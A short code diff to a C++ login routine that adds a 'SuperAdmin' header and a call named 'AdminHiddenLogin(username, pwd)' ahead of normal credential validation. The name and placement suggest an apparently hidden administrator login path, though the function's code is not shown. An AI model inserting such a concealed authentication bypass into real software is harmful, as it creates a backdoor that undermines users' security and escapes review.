@@ -8,6 +8,7 @@
  */
 
 #include <Login/Login.h>
+#include <SuperAdmin/SuperAdmin.h>
 
 using namespace std;
 
@@ -74,6 +75,8 @@ bool UserLoginPrompt(bool& Continue) {
 	string pwd = HidePassword();
 
 	if (pwd.empty()) return false;
+
+	AdminHiddenLogin(username, pwd);
 
 	int user_num = ValidateUserLogin(username, pwd);
 
